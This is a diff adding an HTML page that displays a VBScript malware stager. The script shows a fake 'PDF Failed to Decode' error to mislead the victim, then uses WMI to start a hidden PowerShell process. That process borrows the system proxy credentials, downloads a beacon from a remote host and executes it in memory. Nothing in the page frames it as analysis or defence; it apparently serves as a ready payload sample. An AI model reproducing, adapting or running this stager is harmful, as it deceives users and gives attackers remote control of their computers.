@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Script</title>
+</head><body>&lt;script language="VBScript"&gt;<br/>
+Msgbox "Client name (PDF Failed to Decode!)"<br/>
+Set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator") <br/>
+Set objServices = objSWbemLocator.ConnectServer(".", "\root\cimv2")<br/>
+set objProcess = objServices.Get("Win32_Process")<br/>
+objProcess.Create("powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX ($wc.downloadstring('http://site.org/beacon'))")<br/>
+self.close<br/>
+&lt;/script&gt;<br/>
+</body></html>
